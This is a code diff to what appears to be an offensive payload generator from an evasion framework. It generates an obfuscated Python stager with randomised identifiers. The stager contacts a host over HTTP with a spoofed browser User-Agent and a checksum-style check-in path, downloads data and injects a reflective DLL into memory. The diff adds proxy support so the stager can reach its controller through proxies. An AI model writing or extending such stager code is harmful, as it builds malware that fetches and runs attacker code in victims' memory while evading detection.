@@ -51,6 +51,8 @@ class Payload:
         bufName = helpers.randomString()
         handleName = helpers.randomString()
         data2Name = helpers.randomString()
+        proxy_var = helpers.randomString()
+        opener_var = helpers.randomString()
 
         # helper method that returns the sum of all ord values in a string % 0x100
         payloadCode += "def %s(s): return sum([ord(ch) for ch in s]) %% 0x100\n" %(sumMethodName)
@@ -64,6 +66,9 @@ class Payload:
         
         # method that connects to a host/port over http and downloads the hosted data
         payloadCode += "def %s(%s,%s):\n" %(downloadMethodName, hostName, portName)
+        payloadCode += "\t" + proxy_var + " = urllib2.ProxyHandler()\n"
+        payloadCode += "\t" + opener_var + " = urllib2.build_opener(" + proxy_var + ")\n"
+        payloadCode += "\turllib2.install_opener(" + opener_var + ")\n"
         payloadCode += "\t%s = urllib2.Request(\"http://%%s:%%s/%%s\" %%(%s,%s,%s()), None, {'User-Agent' : 'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)'})\n" %(requestName, hostName, portName, checkinMethodName)
         payloadCode += "\ttry:\n"
         payloadCode += "\t\t%s = urllib2.urlopen(%s)\n" %(tName, requestName)
@@ -72,7 +77,7 @@ class Payload:
         payloadCode += "\t\t\telse: return ''\n"
         payloadCode += "\t\texcept: return %s.read()\n" %(tName)
         payloadCode += "\texcept urllib2.URLError, e: return ''\n"
-        
+
         # method to inject a reflective .dll into memory
         payloadCode += "def %s(%s):\n" %(injectMethodName, dataName)
         payloadCode += "\tif %s != \"\":\n" %(dataName)
